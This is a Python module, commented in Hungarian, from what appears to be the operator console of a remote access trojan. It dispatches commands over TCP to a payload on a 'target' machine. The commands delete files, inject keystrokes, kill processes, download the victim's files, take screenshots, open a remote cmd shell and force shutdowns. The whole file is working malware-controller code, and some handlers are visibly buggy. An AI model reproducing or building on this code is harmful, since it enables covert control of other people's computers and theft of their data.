import socket
import threading
#from pathlib import Path
import time
import os
import msvcrt


import negnox
import TCPHelper
import Components

helpuzenet = '''//célpontok
target       - beállítja a célpontot
rtarget      - vissza állítja hogy ne legyen célpont
settarget    - grafikus felületű célpont beállítás
lsc          - kilistázza a klienseket
//parancsok amik nem küldenek vissza semmit
setwallpaper - beállít egy hátteret ("")
kys          - le killeli a futó payloadot
update       - le frissíti a futó payloadot
delete       - kitöröl fájlokat ("")
msgbox       - megjelenít egy üzenetet ([])
mousex       - elmozgatja az egeret x tengelyen
mousey       - elmozgatja az egeret y tengelyen
keystroke    - lenyomja az adott gombokat ("")
kill         - bezár futó alkalmazásokat ("")
processS     - elindít egy új Process-t ("")
logoff       - kijelentkezteti a felhasználót
shutdown     - lekapcsolja a gépet
restart      - újraindítja a gépet
audio [100]  - beállítja a hangerőt (itt pl 100-ra)
//lokális parancsok
cdme         - könyvtárat vált ("")
lsme         - ki listázza a könyvtár tartalmát
exet         - átmásol, majd el is indít egy fájlt ("")
clear        - képernyő törlése
logo         - kiírja a logót
help         - kiírja ezt az üzenetet
pwdme        - kijelzi hogy mi a jelenlegi lokális könyvtár
copy         - átmásol fájlokat a CÉLPONT gépére ("" "")     
reload       - újra indítja a listenert
//amik vissza is adnak valamit
cd           - könyvtár változtatás a célpont gépén          [$célpont specifikus!$]
ls           - könyvtár kilistázása a célpont gépén          [$célpont specifikus!$]
pwd          - jelenlegi tartózkodási helye a payloadnak     [$célpont specifikus!$]
download     - letölt a célpont gépéről egy adott fájlt      [$célpont specifikus!$]
grp          - vissza küld jelet hogy még él e a gép         [$célpont specifikus!$]
fsi          - fetch system info                             [$célpont specifikus!$]
frp          - fetch running processes                       [$célpont specifikus!$]
fsc          - fetch screens                                 [$célpont specifikus!$]
screenshot   - csinál egy képernyőképet                      [$célpont specifikus!$]
//beépített programok
rShello      - távolról vezérelhető cmd-t nyit               [$célpont specifikus!$]
             - először telepítés : exet "rSL.exe"
mouseC       - távolról vezérelhető desktop applikáció       [$célpont specifikus!$]
             - először telepítés : exet "MCL.exe"'''

def CheckCommand(x):
    xSplittelve = x.split(" ")
    bemenet = Components.parancsDarabolas(x)
    bemenetek = Components.parameterDarabolas(x)

    #itt jönne a switch case DE EZ PYTHON szoval ifxddd

    command = xSplittelve[0]

    if command == "help":
        print(helpuzenet)
    elif command == "":
        print("", end='')
    elif command == "target":
        if len(xSplittelve) == 1:
            print(f"Célpont : {negnox.Program.targetIp}")
        else :
            negnox.Program.targetIp = xSplittelve[1]
            negnox.Program.vanTarget == True
            print(f"{negnox.Program.targetIp} sikeresen beállítva új célpontnak")
    elif command == "rtarget":
        negnox.Program.targetIp = ""
        print("Célpont tisztára frissítve!")
    elif command == "setwallpaper" :
        TCPHelper.TCPHelper.Send("setwallpaper")
        TCPHelper.TCPHelper.Send(bemenetek[1])
    elif command == "msgbox":
        TCPHelper.TCPHelper.Send("msgbox")
        TCPHelper.TCPHelper.Send(bemenet)
    elif command == "kys":
        print("Biztos hogy meg akarod tenni? (y/n)")
        valasz = input()
        if valasz == "y":
            TCPHelper.TCPHelper.Send("kys")
            TCPHelper.TCPHelper.Send("-")
        
        #if msvcrt.kbhit():
        #    char = msvcrt.getch().decode("utf-8")
        #    if char == 'y':
        #        TCPHelper.TCPHelper.Send("kys")
        #        TCPHelper.TCPHelper.Send("-")

    elif command == "lsc":
        if len(negnox.Program.kliensek) == 0:
            print("[Nincsen csatlakozott kliens]")
        else:
            print("csatlakozott kliensek:")
            print("----------------------")
            for c in negnox.Program.kliensek:
                print(f"[{c.getpeername()[0]}]")
            print("----------------------")
    elif command == "mousex":
        TCPHelper.TCPHelper.Send("mousex")
        TCPHelper.TCPHelper.Send(xSplittelve[1])
    elif command == "mousey":
        TCPHelper.TCPHelper.Send("mousey")
        TCPHelper.TCPHelper.Send(xSplittelve[1])
    elif command == "keystroke":
        TCPHelper.TCPHelper.Send("keystroke")
        TCPHelper.TCPHelper.Send(bemenet)
    elif command == "kill":
        if (not bemenet.startswith("\"")) or ("\"" not in bemenet):
            print("Nem helyes a szintaxis!")
        else :
            TCPHelper.TCPHelper.Send("kill")
            TCPHelper.TCPHelper.Send(bemenetek[1])
    elif command == "processS":
        if (not bemenet.startswith("\"")) or ("\"" not in bemenet):
            print("Nem helyes a szintaxis!")
        else :
            TCPHelper.TCPHelper.Send("processS")
            TCPHelper.TCPHelper.Send(bemenetek[1])
    elif command == "logoff":
        TCPHelper.TCPHelper.Send("logoff")
        TCPHelper.TCPHelper.Send("-")
    elif command == "shutdown":
        TCPHelper.TCPHelper.Send("shutdown")
        TCPHelper.TCPHelper.Send("-")        
    elif command == "restart":
        TCPHelper.TCPHelper.Send("restart")
        TCPHelper.TCPHelper.Send("-")        
    elif command == "reload":
        print("[ez itt pythonba bizonyos okok miatt nem működik]")
    elif command == "cd":
        if Components.CheckTargetEnabled():
            TCPHelper.TCPHelper.Send("cd")
            TCPHelper.TCPHelper.Send(bemenet)
    elif command == "cd..":
        if Components.CheckTargetEnabled():
            TCPHelper.TCPHelper.Send("cd..")
            TCPHelper.TCPHelper.Send("-")
    elif command == "ls":
        if Components.CheckTargetEnabled():
            TCPHelper.TCPHelper.Send("ls")
            TCPHelper.TCPHelper.Send("-")
    elif command == "pwd":
        if Components.CheckTargetEnabled():
            TCPHelper.TCPHelper.Send("pwd")
            TCPHelper.TCPHelper.Send("-")
    elif command == "download":
        if Components.CheckTargetEnabled():
            TCPHelper.TCPHelper.Send("download")
            TCPHelper.TCPHelper.Send(bemenet)
    #sajatok
    elif command == "pwdme":
        print(f"{os.getcwd()}")
    elif command == "cdme":
        if xSplittelve[1] == ".." :
            os.chdir(os.path.dirname(os.getcwd()))
        elif xSplittelve[1] == "~":
            os.chdir(negnox.Program.localExePath)
        elif ":" in xSplittelve[1] or "." in xSplittelve[1]:
            os.chdir(xSplittelve[1])
        #print("os.getcwd()")
        else :
            ahova = f"{os.getcwd()}\\{bemenet}"
            if os.path.isdir(ahova) :
                os.chdir(ahova)
            else:
                print("[Nincs ilyen könyvtár ahova lehetne menni]")
    elif command == "cdme..":
        os.chdir(os.path.dirname(os.getcwd()))
    elif command == "lsme":
        cwd = os.getcwd()
        entries = sorted(os.listdir(cwd))

        print(cwd)
        print("Show Directory:")
        print("-" * 70)

        for name in entries:
            full_path = os.path.join(cwd, name)
            is_dir = os.path.isdir(full_path)


            if is_dir:
                print("[MAPPA] > ", end="")
            else:
                print("[FÁJL]  > ", end="")
            # fájlnév kiírás
            print(name, end="")

            # kitöltés szóközökkel
            print("")
            #spaces = 70 - len(name)-10
            #if spaces > 0:
            #    print(" " * spaces)

            

        print("-" * 70)
    #bolond falj muveletek
    elif command == "copy":
        if (not bemenet.startswith("\"")) or ("\"" not in bemenet):
            print("[Nem helyes a szintaxis! (hiányzik \")]")
        else :
            filePath = bemenetek[1]
            filePath.replace("/", "\\")
            if os.path.isfile(filePath):
                print("[A megadott fájl nem létezik!]")
            for item in bemenetek :
                print(item)
            print(len(item))
            if len(bemenet) == 5:
                hova = bemenetek[3]
                TCPHelper.TCPHelper.SendFile(filePath, hova)
            else :
                TCPHelper.TCPHelper.SendFile(filePath, ":DDD")



    #random dolgok amik vissza adnak vmit
    elif command == "fsi":
        if Components.CheckTargetEnabled():
            TCPHelper.TCPHelper.Send("fsi")
            TCPHelper.TCPHelper.Send("-")
    elif command == "grp":
        if Components.CheckTargetEnabled():
            TCPHelper.TCPHelper.Send("getres")
            TCPHelper.TCPHelper.Send("-")
    elif command == "frp":
        if Components.CheckTargetEnabled():
            TCPHelper.TCPHelper.Send("fsi")
            TCPHelper.TCPHelper.Send("-")
    elif command == "cmd":
        if Components.CheckTargetEnabled():
            TCPHelper.TCPHelper.Send("cmd")
            TCPHelper.TCPHelper.Send(bemenet)

    elif command == "screenshot":
        if Components.CheckTargetEnabled():
            TCPHelper.TCPHelper.Send("fsi")
            TCPHelper.TCPHelper.Send("-")
    elif command == "audio":
        if Components.CheckTargetEnabled():
            TCPHelper.TCPHelper.Send("audio")
            if bemenet == "" :
                TCPHelper.TCPHelper.Send("100")
            else :
                TCPHelper.TCPHelper.Send(bemenet)
    elif command == "exit":
        os._exit()
    elif command == "cls" or command == "clear":
        negnox.clear()
    elif command == "logo":
        negnox.writeLogo()
    
    
    
    else:
        print("ismeretlen parancs!")   

